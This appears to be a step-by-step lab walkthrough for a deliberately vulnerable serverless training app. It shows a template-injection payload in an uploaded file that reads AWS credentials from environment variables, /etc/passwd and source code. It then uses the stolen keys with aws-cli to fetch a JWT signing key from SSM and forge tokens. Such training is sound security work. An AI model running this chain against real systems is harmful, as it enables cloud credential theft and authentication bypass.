# Serverless JWT Attack


##### Step 1:

* Access the application on the browser: [`https://serverless-attack.netlify.com`](https://serverless-attack.netlify.com).

* Click on `Registration`

* Enter the necessary details and register as a user.

###### * Note: The details provided CAN be fake and we highly recommend it!


##### Step 2:

* Navigate to the login page, enter the details and login to the application.

* Once logged in, copy the value of `token` that can be found in `Session Storage` under the `Storage` section in `developer tools`

##### Step 3:

* Once logged in, click on the `File-Upload` icon present in the header.

* Click on the `Upload` button. Upload the `readme.txt` file. 

* Once uploaded, the contents of the file is rendered on the UI.

###### * Note: It only accepts `.txt` files.


#### What are the potential attacks based on this functionality???

---

##### Step 4:

* Click on the `File-Upload` icon present in the header.

* Click on the `Upload` button. Upload the `malicious-file.txt` file. 

* Observe the output rendered on the UI.

##### Step 5:

* Sensitive information like the ones mentioned below can be fetched from the environment variables:

    * `AWS_SESSION_TOKEN`

    * `AWS_SECURITY_TOKEN`

    * `AWS_ACCESS_KEY_ID`

    * `AWS_DEFAULT_REGION`

    * `AWS_SECRET_ACCESS_KEY`


* On the Server provisioned, set the values fetched from the previous step as `Enironment variables`


```bash
export AWS_SESSION_TOKEN=<VALUE-OF-AWS_SESSION_TOKEN>

export AWS_SECURITY_TOKEN=<VALUE-OF-AWS_SECURITY_TOKEN>

export AWS_ACCESS_KEY_ID=<VALUE-OF-AWS_ACCESS_KEY_ID>

export AWS_DEFAULT_REGION=<VALUE-OF-AWS_DEFAULT_REGION>

export AWS_SECRET_ACCESS_KEY=<VALUE-OF-AWS_SECRET_ACCESS_KEY>
```


##### Step 6:

* Click on the `File-Upload` icon present in the header.

* Click on the `Upload` button. Upload the `read-etc-pwd.txt` file. 

* Observe the output rendered on the UI.


##### Step 7:

* Similarly, upload `read-py-files.txt` file and observe the results

* By observing source-code of application, we can see that `auth` is imported.

* Edit `read-py-files.txt` file to fetch source-code of `auth.py` and upload the file

```bash
{{ ''.__class__.__mro__[2].__subclasses__()[40]('auth.py').read() }}
```

* From `auth.py`, it can be observed that `AWS SSM` is being used and `JWT_PASS` is the parameter that needs to be fetched.


##### Step 8:

* Use `aws-cli` to fetch decrypted `JWT_PASS` from `SSM` 

###### * Note: Ensure that `aws-cli` has been installed and the AWS `environment variables` have been set 

```bash
aws ssm get-parameters --names "JWT_PASS" --with-decryption
```

* The `Value` fetched in encoded with `base64`. Decode to get the private key.

```bash
echo "<JWT_PASS value>" | base64 --d > privkey
```

##### Step 9:

* Using the private key, create a public key using `openssl`

```bash
openssl rsa -in privkey -pubout -outform PEM -out public.key.pub
```

##### Step 10:

* On the browser, access [`https://jwt.io`](https://jwt.io) and paste the `JWT Token` fetched in Step 2.

* Paste the value of `privkey` and `public.key.pub` under the `Verify Signature` section.

* The `Payload` data can now be tampered with

